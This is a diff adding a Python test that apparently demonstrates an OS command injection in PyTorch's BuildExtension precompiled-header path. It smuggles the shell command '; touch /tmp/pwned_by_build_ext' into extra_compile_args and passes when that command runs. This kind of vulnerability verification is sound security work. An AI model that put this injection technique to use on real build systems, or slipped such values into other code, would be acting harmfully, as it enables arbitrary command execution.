@@ -1,0 +1,68 @@
+import os
+import tempfile
+import shutil
+from setuptools import Distribution
+from torch.utils.cpp_extension import BuildExtension, CppExtension
+
+def test_build_extension_command_injection():
+    """
+    Test case for OS command injection in torch.utils.cpp_extension.BuildExtension.
+    This test adapts the vulnerability found in load_inline (use_pch path) to BuildExtension.
+    """
+    tmpdir = tempfile.mkdtemp()
+    # Define a payload file to verify command execution
+    payload_file = "/tmp/pwned_by_build_ext"
+    
+    # Clean up payload file if it exists from previous runs
+    if os.path.exists(payload_file):
+        os.remove(payload_file)
+
+    try:
+        # Create a dummy C++ source file
+        cpp_file = os.path.join(tmpdir, "test.cpp")
+        with open(cpp_file, "w") as f:
+            f.write("void foo() {}")
+
+        # Create a CppExtension with a malicious payload in extra_compile_args.
+        # The payload attempts to create a file using shell metacharacters.
+        # If the vulnerability exists, the shell command '; touch /tmp/pwned_by_build_ext' will be executed.
+        ext = CppExtension(
+            name="test_ext",
+            sources=[cpp_file],
+            extra_compile_args=["-O2", f"; touch {payload_file}"]
+        )
+
+        # Define a custom BuildExtension that forces use_pch=True.
+        # The vulnerability is triggered in the precompiled-header build helper.
+        class VulnerableBuildExtension(BuildExtension):
+            def __init__(self, dist):
+                # Pass use_pch=True to enable the vulnerable code path
+                super().__init__(dist, use_pch=True)
+
+        # Setup the distribution and build command
+        dist = Distribution({'ext_modules': [ext]})
+        cmd = VulnerableBuildExtension(dist)
+        
+        # Configure the command to build in place (within the temp directory)
+        cmd.inplace = 1
+        cmd.ensure_finalized()
+        
+        # Run the build process
+        # This should trigger the compilation. If vulnerable, the shell command will execute.
+        cmd.run()
+
+        # Assertion: Verify that the payload file was created.
+        # If the file exists, the OS command injection was successful.
+        assert os.path.exists(payload_file), \
+            "OS Command Injection failed: The payload file was not created. " \
+            "This might indicate the bug is fixed or the PCH path was not triggered."
+
+    finally:
+        # Clean up the temporary directory
+        shutil.rmtree(tmpdir)
+        # Clean up the payload file if it was created
+        if os.path.exists(payload_file):
+            os.remove(payload_file)
+
+if __name__ == "__main__":
+    test_build_extension_command_injection()
